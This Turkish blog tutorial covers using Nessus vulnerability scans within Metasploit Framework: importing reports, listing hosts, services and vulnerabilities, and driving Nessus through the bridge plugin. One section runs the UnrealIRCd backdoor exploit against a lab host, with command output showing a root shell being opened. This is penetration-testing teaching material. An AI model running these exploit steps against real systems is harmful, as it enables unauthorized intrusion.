---

authors:
  - name: İbrahim Korucuoğlu
    link: https://github.com/siberoloji
    image: https://github.com/siberoloji.png


categories:
- Metasploit Framework
classicmag_header_overlay:
- global-layout
classicmag_post_layout:
- layout-1
classicmag_post_sidebar_option:
- right-sidebar
date: "2017-05-18T13:08:00Z"
excerpt: Nessus, kişisel ve ticari olmayan kullanım için ücretsiz olarak edinilebilen
  bir zafiyet tarama programıdır. Tenable firması tarafından geliştirilmekte olan
  Nessus tarama programını ve sonuçlarını Metasploit Framework içerisinde kullanabilirsiniz.
  Bu yazıda, genel hatlarıyla Nessus programının Metasploit Framework içerisinde kullanımını
  göreceğiz.
guid: https://www.siberoloji.com/?p=1169
id: 1169
image: /assets/images/2024/06/metasploit.jpg
tags:
- cybersecurity
- metasploit framework
title: MSF İçinde Nessus Kullanmak
url: /tr/msf-icinde-nessus-kullanmak/
---

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="nessus-nedir">Nessus nedir? 
<!-- /wp:heading -->

  Nessus, kişisel ve ticari olmayan kullanım için ücretsiz olarak edinilebilen bir zafiyet tarama programıdır. Tenable firması tarafından geliştirilmekte olan Nessus tarama programını ve sonuçlarını Metasploit Framework içerisinde kullanabilirsiniz. Bu yazıda, genel hatlarıyla Nessus programının Metasploit Framework içerisinde kullanımını göreceğiz. 
 

 
<h2 class="wp-block-heading" id="nessus-sonuçlarını-i̇çe-aktarma">Nessus Sonuçlarını İçe Aktarma</h2>
<!-- /wp:heading -->

  Nessus arayüzünde bir tarama yaptıktan sonra, sonuçları&nbsp;<code>.nbe</code>&nbsp;formatında kayıt edebilirsiniz. Bu dosyayı Metasploit Framework için&nbsp;<code>db_import</code>&nbsp;komutuyla aktaralım. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf <strong>&gt;</strong> db_import /root/Nessus/nessus_scan.nbe
<strong>[</strong><strong>*</strong><strong>]</strong> Importing 'Nessus NBE Report' data
<strong>[</strong><strong>*</strong><strong>]</strong> Importing host 172.16.194.254
<strong>[</strong><strong>*</strong><strong>]</strong> Importing host 172.16.194.254
<strong>[</strong><strong>*</strong><strong>]</strong> Importing host 172.16.194.254
<strong>[</strong><strong>*</strong><strong>]</strong> Importing host 172.16.194.2
<strong>[</strong><strong>*</strong><strong>]</strong> Importing host 172.16.194.2
<strong>[</strong><strong>*</strong><strong>]</strong> Importing host 172.16.194.2
...snip...
<strong>[</strong><strong>*</strong><strong>]</strong> Importing host 172.16.194.1
<strong>[</strong><strong>*</strong><strong>]</strong> Importing host 172.16.194.1
<strong>[</strong><strong>*</strong><strong>]</strong> Importing host 172.16.194.1
<strong>[</strong><strong>*</strong><strong>]</strong> Importing host 172.16.194.1
<strong>[</strong><strong>*</strong><strong>]</strong> Importing host 172.16.194.1
<strong>[</strong><strong>*</strong><strong>]</strong> Successfully imported /root/Nessus/nessus_scan.nbe
msf <strong>&gt;</strong> 
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="hosts-kontrolü">hosts Kontrolü</h2>
<!-- /wp:heading -->

  İçe aktarma işleminden sonra,&nbsp;<code>hosts</code>komutuyla tabloya kayıt edilen&nbsp;<code>IP</code>&nbsp;adreslerini kontrol edelim. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf <strong>&gt;</strong> hosts

Hosts
<strong>=====</strong>

address         mac  name    os_name                                                                             os_flavor  os_sp  purpose  info  comments
-------         ---  ----    -------                                                                             ---------  -----  -------  ----  --------
172.16.194.1                 one of these operating systems : \nMac OS X 10.5\nMac OS X 10.6\nMac OS X 10.7\n                      device         
172.16.194.2                 Unknown                                                                                               device         
172.16.194.134               Microsoft Windows                                                                   XP         SP2    client         
172.16.194.148               Linux Kernel 2.6 on Ubuntu 8.04 <strong>(</strong>hardy<strong>)</strong>\n                                                             device         
172.16.194.163               Linux Kernel 3.2.6 on Ubuntu 10.04\n                                                                  device         
172.16.194.165       phpcgi  Linux phpcgi 2.6.32-38-generic-pae <em>#83-Ubuntu SMP Wed Jan 4 12:11:13 UTC 2012 i686                    device         </em>
172.16.194.172               Linux Kernel 2.6 on Ubuntu 8.04 <strong>(</strong>hardy<strong>)</strong>\n                                                             device                                                                                                                                          

msf <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="services-kontrolü">services Kontrolü</h2>
<!-- /wp:heading -->

  Ayrıca,&nbsp;<code>services</code>&nbsp;komutuyla, bulunan IP adreslerinde çalışan servisleri görüntüleyelim. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf <strong>&gt;</strong> services 172.16.194.172

Services
<strong>========</strong>

host            port   proto  name            state  info
----            ----   -----  ----            -----  ----
172.16.194.172  21     tcp    ftp             open   
172.16.194.172  22     tcp    ssh             open   
172.16.194.172  23     tcp    telnet          open   
172.16.194.172  25     tcp    smtp            open   
172.16.194.172  53     udp    dns             open   
172.16.194.172  53     tcp    dns             open   
172.16.194.172  69     udp    tftp            open   
172.16.194.172  80     tcp    www             open   
172.16.194.172  111    tcp    rpc-portmapper  open   
172.16.194.172  111    udp    rpc-portmapper  open   
172.16.194.172  137    udp    netbios-ns      open   
172.16.194.172  139    tcp    smb             open   
172.16.194.172  445    tcp    cifs            open   
172.16.194.172  512    tcp    rexecd          open   
172.16.194.172  513    tcp    rlogin          open   
172.16.194.172  514    tcp    rsh             open   
172.16.194.172  1099   tcp    rmi_registry    open   
172.16.194.172  1524   tcp                    open   
172.16.194.172  2049   tcp    rpc-nfs         open   
172.16.194.172  2049   udp    rpc-nfs         open   
172.16.194.172  2121   tcp    ftp             open   
172.16.194.172  3306   tcp    mysql           open   
172.16.194.172  5432   tcp    postgresql      open   
172.16.194.172  5900   tcp    vnc             open   
172.16.194.172  6000   tcp    x11             open   
172.16.194.172  6667   tcp    irc             open   
172.16.194.172  8009   tcp    ajp13           open   
172.16.194.172  8787   tcp                    open   
172.16.194.172  45303  udp    rpc-status      open   
172.16.194.172  45765  tcp    rpc-mountd      open   
172.16.194.172  47161  tcp    rpc-nlockmgr    open   
172.16.194.172  50410  tcp    rpc-status      open   
172.16.194.172  52843  udp    rpc-nlockmgr    open   
172.16.194.172  55269  udp    rpc-mountd      open 
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="vulns-kontrolü">vulns Kontrolü</h2>
<!-- /wp:heading -->

  <code>vulns</code>&nbsp;komutuyla, Bu Ip adreslerinde çalışan servislere ait varsa zafiyetleri listeleyelim.&nbsp;<code>vulns</code>&nbsp;komutuyla listeleme yaparken çeşitli filtreleme seçeneklerini kullanabilirsiniz. Bunları&nbsp;<code>help vulns</code>&nbsp;komutuyla incelemenizi tavsiye ediyorum. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf <strong>&gt;</strong> help vulns
Print all vulnerabilities <strong>in </strong>the database

Usage: vulns <strong>[</strong>addr range]

  -h,--help             Show this help information
  -p,--port <strong>&gt;</strong>portspec&gt;  List vulns matching this port spec
  -s <strong>&gt;</strong>svc names&gt;        List vulns matching these service names
  -S,--search           Search string to filter by
  -i,--info             Display Vuln Info

Examples:
  vulns -p 1-65536          <em># only vulns with associated services</em>
  vulns -p 1-65536 -s http  <em># identified as http on any port</em>

msf <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

  IP adreslerinde, 139 numaralı Portlara ait zafiyetleri görelim. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf <strong>&gt;</strong> vulns -p 139
<strong>[</strong><strong>*</strong><strong>]</strong> Time: 2012-06-15 18:32:26 UTC Vuln: host<strong>=</strong>172.16.194.134 name<strong>=</strong>NSS-11011 refs<strong>=</strong>NSS-11011 
<strong>[</strong><strong>*</strong><strong>]</strong> Time: 2012-06-15 18:32:23 UTC Vuln: host<strong>=</strong>172.16.194.172 name<strong>=</strong>NSS-11011 refs<strong>=</strong>NSS-11011 

msf <strong>&gt;</strong> vulns -p 22
<strong>[</strong><strong>*</strong><strong>]</strong> Time: 2012-06-15 18:32:25 UTC Vuln: host<strong>=</strong>172.16.194.148 name<strong>=</strong>NSS-10267 refs<strong>=</strong>NSS-10267 
<strong>[</strong><strong>*</strong><strong>]</strong> Time: 2012-06-15 18:32:25 UTC Vuln: host<strong>=</strong>172.16.194.148 name<strong>=</strong>NSS-22964 refs<strong>=</strong>NSS-22964 
<strong>[</strong><strong>*</strong><strong>]</strong> Time: 2012-06-15 18:32:25 UTC Vuln: host<strong>=</strong>172.16.194.148 name<strong>=</strong>NSS-10881 refs<strong>=</strong>NSS-10881 
<strong>[</strong><strong>*</strong><strong>]</strong> Time: 2012-06-15 18:32:25 UTC Vuln: host<strong>=</strong>172.16.194.148 name<strong>=</strong>NSS-39520 refs<strong>=</strong>NSS-39520 
<strong>[</strong><strong>*</strong><strong>]</strong> Time: 2012-06-15 18:32:25 UTC Vuln: host<strong>=</strong>172.16.194.163 name<strong>=</strong>NSS-39520 refs<strong>=</strong>NSS-39520 
<strong>[</strong><strong>*</strong><strong>]</strong> Time: 2012-06-15 18:32:25 UTC Vuln: host<strong>=</strong>172.16.194.163 name<strong>=</strong>NSS-25221 refs<strong>=</strong>NSS-25221 
<strong>[</strong><strong>*</strong><strong>]</strong> Time: 2012-06-15 18:32:25 UTC Vuln: host<strong>=</strong>172.16.194.163 name<strong>=</strong>NSS-10881 refs<strong>=</strong>NSS-10881 
<strong>[</strong><strong>*</strong><strong>]</strong> Time: 2012-06-15 18:32:25 UTC Vuln: host<strong>=</strong>172.16.194.163 name<strong>=</strong>NSS-10267 refs<strong>=</strong>NSS-10267 
<strong>[</strong><strong>*</strong><strong>]</strong> Time: 2012-06-15 18:32:25 UTC Vuln: host<strong>=</strong>172.16.194.163 name<strong>=</strong>NSS-22964 refs<strong>=</strong>NSS-22964 
<strong>[</strong><strong>*</strong><strong>]</strong> Time: 2012-06-15 18:32:24 UTC Vuln: host<strong>=</strong>172.16.194.172 name<strong>=</strong>NSS-39520 refs<strong>=</strong>NSS-39520 
<strong>[</strong><strong>*</strong><strong>]</strong> Time: 2012-06-15 18:32:24 UTC Vuln: host<strong>=</strong>172.16.194.172 name<strong>=</strong>NSS-10881 refs<strong>=</strong>NSS-10881 
<strong>[</strong><strong>*</strong><strong>]</strong> Time: 2012-06-15 18:32:24 UTC Vuln: host<strong>=</strong>172.16.194.172 name<strong>=</strong>NSS-32314 refs<strong>=</strong>CVE-2008-0166,BID-29179,OSVDB-45029,CWE-310,NSS-32314 
<strong>[</strong><strong>*</strong><strong>]</strong> Time: 2012-06-15 18:32:24 UTC Vuln: host<strong>=</strong>172.16.194.172 name<strong>=</strong>NSS-10267 refs<strong>=</strong>NSS-10267 
<strong>[</strong><strong>*</strong><strong>]</strong> Time: 2012-06-15 18:32:24 UTC Vuln: host<strong>=</strong>172.16.194.172 name<strong>=</strong>NSS-22964 refs<strong>=</strong>NSS-22964 
</code></pre>
<!-- /wp:code -->

  <code>172.16.194.172</code>&nbsp;IP adresine ait&nbsp;<code>6667</code>&nbsp;numaralı porta ait zafiyetleri görelim. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf <strong>&gt;</strong> vulns 172.16.194.172 -p 6667
<strong>[</strong><strong>*</strong><strong>]</strong> Time: 2012-06-15 18:32:23 UTC Vuln: host<strong>=</strong>172.16.194.172 name<strong>=</strong>NSS-46882 refs<strong>=</strong>CVE-2010-2075,BID-40820,OSVDB-65445,NSS-46882 
<strong>[</strong><strong>*</strong><strong>]</strong> Time: 2012-06-15 18:32:23 UTC Vuln: host<strong>=</strong>172.16.194.172 name<strong>=</strong>NSS-11156 refs<strong>=</strong>NSS-11156 
<strong>[</strong><strong>*</strong><strong>]</strong> Time: 2012-06-15 18:32:23 UTC Vuln: host<strong>=</strong>172.16.194.172 name<strong>=</strong>NSS-17975 refs<strong>=</strong>NSS-17975 
msf <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

  <code>6667</code>&nbsp;numaralı porta ait zafiyet olarak listelenen&nbsp;<code>cve:2010-2075</code>&nbsp;zafiyetine ait Metasploit Framework modüllerinde herhangi bir modül var mı? Aratalım. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf <strong>&gt;</strong> search cve:2010-2075

Matching Modules
<strong>================</strong>

   Name                                        Disclosure Date  Rank       Description
   ----                                        ---------------  ----       -----------
   exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  UnrealIRCD 3.2.8.1 Backdoor Command Execution


msf <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

  Arama sonucunda,&nbsp;<code>exploit/unix/irc/unreal_ircd_3281_backdoor</code>&nbsp;isimli bir exploit modülü bulunduğunu görüyoruz. Şimdi bu modülü kullanalım. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf  use exploit/unix/irc/unreal_ircd_3281_backdoor

msf  exploit<strong>(</strong>unreal_ircd_3281_backdoor<strong>)</strong> <strong>&gt;</strong> exploit

<strong>[</strong><strong>*</strong><strong>]</strong> Started reverse double handler
<strong>[</strong><strong>*</strong><strong>]</strong> Connected to 172.16.194.172:6667...
    :irc.Metasploitable.LAN NOTICE AUTH :<strong>***</strong> Looking up your hostname...
    :irc.Metasploitable.LAN NOTICE AUTH :<strong>***</strong> Couldn't resolve your hostname; using your IP address instead
[*] Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo Q4SefN7pIVSQUL2F;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "Q4SefN7pIVSQUL2F\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (172.16.194.163:4444 -&gt; 172.16.194.172:35941) at 2012-06-15 15:08:51 -0400

ifconfig
eth0      Link encap:Ethernet  HWaddr 00:0c:29:d1:62:80  
          inet addr:172.16.194.172  Bcast:172.16.194.255  Mask:255.255.255.0
          inet6 addr: fe80::20c:29ff:fed1:6280/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:290453 errors:0 dropped:0 overruns:0 frame:0
          TX packets:402340 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:41602322 (39.6 MB)  TX bytes:344600671 (328.6 MB)
          Interrupt:19 Base address:0x2000 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:774 errors:0 dropped:0 overruns:0 frame:0
          TX packets:774 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:343253 (335.2 KB)  TX bytes:343253 (335.2 KB)

id
uid=0(root) gid=0(root)
</code></pre>
<!-- /wp:code -->

  Exploit modülünün kullanımı ile Hedef IP adresinde bir komut satırı açılmıştır. 
 

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="nessus-programını-doğrudan-msf-i̇çinden-kullanma">Nessus Programını Doğrudan MSF İçinden Kullanma 
<!-- /wp:heading -->

  Önceki bölümde, Nessus programının yaptığı bir taramayı&nbsp;<code>.nbe</code>&nbsp;formatında kaydedip, Metasploit içerisine aktarım kullanmıştık. Komut satırını kullanmayı seviyorsanız, Nessus programını doğrudan komut satırından da kullanabilirsiniz. Bunun gerçekleşebilmesi için Metasploit Framework için geliştirilen&nbsp;<code>Nessus Bridge Plugin</code>&nbsp;isimli bir eklenti bulunmaktadır. 
 

 
<h2 class="wp-block-heading" id="nessus-bridge-eklentisi-başlatma">Nessus Bridge Eklentisi Başlatma</h2>
<!-- /wp:heading -->

  <code>msfconsole</code>&nbsp;içerisinden Nessus kullanım için gerekli eklentiyi yükleyelim. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf <strong>&gt;</strong> load nessus
<strong>[</strong><strong>*</strong><strong>]</strong> Nessus Bridge <strong>for </strong>Metasploit 1.1
<strong>[</strong>+] Type nessus_help <strong>for </strong>a command listing
<strong>[</strong><strong>*</strong><strong>]</strong> Successfully loaded plugin: nessus
</code></pre>
<!-- /wp:code -->

  Bu eklentinin bize sunduğu komutları görmek için,&nbsp;<code>nessus_help</code>&nbsp;yardım komutunu görüntüleyelim. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf <strong>&gt;</strong> nessus_help
<strong>[</strong>+] Nessus Help
<strong>[</strong>+] type nessus_help command <strong>for </strong>help with specific commands

Command                    Help Text
-------                    ---------
Generic Commands          
-----------------          -----------------
nessus_connect             Connect to a nessus server
nessus_logout              Logout from the nessus server
nessus_help                Listing of available nessus commands
nessus_server_status       Check the status of your Nessus Server
nessus_admin               Checks <strong>if </strong>user is an admin
nessus_server_feed         Nessus Feed Type
nessus_find_targets        Try to find vulnerable targets from a report
                          
Reports Commands          
-----------------          -----------------
nessus_report_list         List all Nessus reports
nessus_report_get          Import a report from the nessus server <strong>in </strong>Nessus v2 format
nessus_report_hosts        Get list of hosts from a report
nessus_report_host_ports   Get list of open ports from a host from a report
nessus_report_host_detail  Detail from a report item on a host
                          
Scan Commands             
-----------------          -----------------
nessus_scan_new            Create new Nessus Scan
nessus_scan_status         List all currently running Nessus scans
...snip...
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="nessus-sunucuya-bağlanma">Nessus Sunucuya Bağlanma</h2>
<!-- /wp:heading -->

  <code>msfconsole</code>&nbsp;içerisinden Nessus programına komut gönderebilmek için öncelikle Nessus sunucuya bağlanmamız gerekmektedir. Bunun için&nbsp;<code>nessus_connect dook:s3cr3t@192.168.1.100 ok</code>&nbsp;komut şablonunu kullanıyoruz. Burada&nbsp;<strong>dook</strong>&nbsp;Nessus için kullandığınız&nbsp;<strong>kullanıcı adınız</strong>&nbsp;,&nbsp;<strong>s3cr3t</strong>&nbsp;Nessus parolanızdır.&nbsp;<strong>192.168.1.100</strong>&nbsp;IP adresi yerine, sisteminizde Nessus sunucunun çalıştığı IP adresini yazmalısınız. Komutun sonundaki&nbsp;<code>ok</code>&nbsp;parametresi, Nessus’a dışarıdan bağlandığınızı ve güvenlik ikazını kabul ettiğinizi onaylamak için zorunludur. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf <strong>&gt;</strong> nessus_connect dook:s3cr3t@192.168.1.100
<strong>[</strong>-] Warning: SSL connections are not verified <strong>in </strong>this release, it is possible <strong>for </strong>an attacker
<strong>[</strong>-]          with the ability to man-in-the-middle the Nessus traffic to capture the Nessus
<strong>[</strong>-]          credentials. If you are running this on a trusted network, please pass <strong>in</strong> 'ok'
<strong>[</strong>-]          as an additional parameter to this command.
msf <strong>&gt;</strong> nessus_connect dook:s3cr3t@192.168.1.100 ok
<strong>[</strong><strong>*</strong><strong>]</strong> Connecting to <a href="https://192.168.1.100:8834/">https://192.168.1.100:8834/</a> as dook
<strong>[</strong><strong>*</strong><strong>]</strong> Authenticated
msf <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="nessus-tarama-politikalarını-görüntüleme">Nessus Tarama Politikalarını Görüntüleme</h2>
<!-- /wp:heading -->

  Nessus sunucuda bulunan tarama politikalarını&nbsp;<code>nessus_policy_list</code>&nbsp;komutuyla görüntüleyelim. Herhangi bir tarama politikanız yoksa, Nessus Görsel arayüzüne giderek oluşturmanız gerekmektedir. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf <strong>&gt;</strong> nessus_policy_list
<strong>[</strong>+] Nessus Policy List

ID  Name       Owner  visability
--  ----       -----  ----------
1   the_works  dook   private

msf <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="nessus-i̇le-yeni-bir-tarama-başlatma">Nessus İle Yeni Bir Tarama Başlatma</h2>
<!-- /wp:heading -->

  Artık tarama politikalarını da görüntüledikten sonra yeni bir tarama başlatabiliriz. Taramayı başlatmak için&nbsp;<code>nessus_scan_new</code>&nbsp;komutu kullanılır. Komut,&nbsp;<code>nessus_scan_new</code>,&nbsp;<code>id</code>,&nbsp;<code>scan name</code>,&nbsp;<code>targets</code>&nbsp;parçalarından oluşur. Aşağıda örneğini görebilirsiniz. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf <strong>&gt;</strong> nessus_scan_new
<strong>[</strong><strong>*</strong><strong>]</strong> Usage:
<strong>[</strong><strong>*</strong><strong>]</strong>        nessus_scan_new policy id scan name targets
<strong>[</strong><strong>*</strong><strong>]</strong>        use nessus_policy_list to list all available policies


msf <strong>&gt;</strong> nessus_scan_new 1 pwnage 192.168.1.161
<strong>[</strong><strong>*</strong><strong>]</strong> Creating scan from policy number 1, called "pwnage" and scanning 192.168.1.161
<strong>[</strong><strong>*</strong><strong>]</strong> Scan started.  uid is 9d337e9b-82c7-89a1-a194-4ef154b82f624de2444e6ad18a1f
msf <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="devam-eden-tarama-durumunu-görüntüleme">Devam Eden Tarama Durumunu Görüntüleme</h2>
<!-- /wp:heading -->

  <code>nessus_scan_new</code>&nbsp;komutuyla başlattığınız taramanın ne durumda olduğunu,&nbsp;<code>nessus_scan_status</code>&nbsp;komutuyla kontrol edebilirsiniz. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf <strong>&gt;</strong> nessus_scan_status
<strong>[</strong>+] Running Scans

Scan ID                                               Name    Owner  Started            Status   Current Hosts  Total Hosts
-------                                               ----    -----  -------            ------   -------------  -----------
9d337e9b-82c7-89a1-a194-4ef154b82f624de2444e6ad18a1f  pwnage  dook   19:39 Sep 27 2010  running  0              1


<strong>[</strong><strong>*</strong><strong>]</strong> You can:
<strong>[</strong>+]         Import Nessus report to database :     nessus_report_get reportid
<strong>[</strong>+]         Pause a nessus scan :             nessus_scan_pause scanid
msf <strong>&gt;</strong> nessus_scan_status
<strong>[</strong><strong>*</strong><strong>]</strong> No Scans Running.
<strong>[</strong><strong>*</strong><strong>]</strong> You can:
<strong>[</strong><strong>*</strong><strong>]</strong>         List of completed scans:         nessus_report_list
<strong>[</strong><strong>*</strong><strong>]</strong>         Create a scan:                   nessus_scan_new policy id scan name target<strong>(</strong>s<strong>)</strong>
msf <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="tarama-sonucunu-alma">Tarama Sonucunu Alma</h2>
<!-- /wp:heading -->

  Nessus taraması tamamlandığında kendi içinde bir rapor oluşturur. Metasploit Framework içine alınabilecek raporların listesini&nbsp;<code>nessus_report_list</code>&nbsp;komutuyla görüntüleyelim. Ardından, raporun&nbsp;<code>ID</code>&nbsp;numarasını vererek,&nbsp;<code>nessus_report_get</code>&nbsp;komutuyla&nbsp;<code>msfconsole</code>&nbsp;içine ithal edelim. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf <strong>&gt;</strong> nessus_report_list
<strong>[</strong>+] Nessus Report List

ID                                                    Name    Status     Date
--                                                    ----    ------     ----
9d337e9b-82c7-89a1-a194-4ef154b82f624de2444e6ad18a1f  pwnage  completed  19:47 Sep 27 2010

<strong>[</strong><strong>*</strong><strong>]</strong> You can:
<strong>[</strong><strong>*</strong><strong>]</strong>         Get a list of hosts from the report:          nessus_report_hosts report id


msf <strong>&gt;</strong> nessus_report_get
<strong>[</strong><strong>*</strong><strong>]</strong> Usage:
<strong>[</strong><strong>*</strong><strong>]</strong>        nessus_report_get report id
<strong>[</strong><strong>*</strong><strong>]</strong>        use nessus_report_list to list all available reports <strong>for </strong>importing


msf <strong>&gt;</strong> nessus_report_get 9d337e9b-82c7-89a1-a194-4ef154b82f624de2444e6ad18a1f
<strong>[</strong><strong>*</strong><strong>]</strong> importing 9d337e9b-82c7-89a1-a194-4ef154b82f624de2444e6ad18a1f
msf <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

 
<h2 class="wp-block-heading" id="sonuçları-görüntüleme">Sonuçları Görüntüleme</h2>
<!-- /wp:heading -->

  İçeri aktarılan tarama sonuçlarını, önceki bölümde olduğu gibi&nbsp;<code>hosts</code>,&nbsp;<code>services</code>&nbsp;ve&nbsp;<code>vulns</code>&nbsp;komutlarıyla görüntüleyebilirsiniz. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf <strong>&gt;</strong> hosts -c address,vulns

Hosts
<strong>=====</strong>

address        vulns
-------        -----
192.168.1.161  33
</code></pre>
<!-- /wp:code -->

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf <strong>&gt;</strong> vulns
<strong>[</strong><strong>*</strong><strong>]</strong> Time: 2010-09-28 01:51:37 UTC Vuln: host<strong>=</strong>192.168.1.161 port<strong>=</strong>3389 proto<strong>=</strong>tcp name<strong>=</strong>NSS-10940 refs<strong>=</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Time: 2010-09-28 01:51:37 UTC Vuln: host<strong>=</strong>192.168.1.161 port<strong>=</strong>1900 proto<strong>=</strong>udp name<strong>=</strong>NSS-35713 refs<strong>=</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Time: 2010-09-28 01:51:37 UTC Vuln: host<strong>=</strong>192.168.1.161 port<strong>=</strong>1030 proto<strong>=</strong>tcp name<strong>=</strong>NSS-22319 refs<strong>=</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Time: 2010-09-28 01:51:37 UTC Vuln: host<strong>=</strong>192.168.1.161 port<strong>=</strong>445 proto<strong>=</strong>tcp name<strong>=</strong>NSS-10396 refs<strong>=</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Time: 2010-09-28 01:51:38 UTC Vuln: host<strong>=</strong>192.168.1.161 port<strong>=</strong>445 proto<strong>=</strong>tcp name<strong>=</strong>NSS-10860 refs<strong>=</strong>CVE-2000-1200,BID-959,OSVDB-714
<strong>[</strong><strong>*</strong><strong>]</strong> Time: 2010-09-28 01:51:38 UTC Vuln: host<strong>=</strong>192.168.1.161 port<strong>=</strong>445 proto<strong>=</strong>tcp name<strong>=</strong>NSS-10859 refs<strong>=</strong>CVE-2000-1200,BID-959,OSVDB-715
<strong>[</strong><strong>*</strong><strong>]</strong> Time: 2010-09-28 01:51:39 UTC Vuln: host<strong>=</strong>192.168.1.161 port<strong>=</strong>445 proto<strong>=</strong>tcp name<strong>=</strong>NSS-18502 refs<strong>=</strong>CVE-2005-1206,BID-13942,IAVA-2005-t-0019
<strong>[</strong><strong>*</strong><strong>]</strong> Time: 2010-09-28 01:51:40 UTC Vuln: host<strong>=</strong>192.168.1.161 port<strong>=</strong>445 proto<strong>=</strong>tcp name<strong>=</strong>NSS-20928 refs<strong>=</strong>CVE-2006-0013,BID-16636,OSVDB-23134
<strong>[</strong><strong>*</strong><strong>]</strong> Time: 2010-09-28 01:51:41 UTC Vuln: host<strong>=</strong>192.168.1.161 port<strong>=</strong>445 proto<strong>=</strong>tcp name<strong>=</strong>NSS-35362 refs<strong>=</strong>CVE-2008-4834,BID-31179,OSVDB-48153
<strong>[</strong><strong>*</strong><strong>]</strong> Time: 2010-09-28 01:51:41 UTC Vuln: host<strong>=</strong>192.168.1.161
...snip...</code></pre>
<!-- /wp:code -->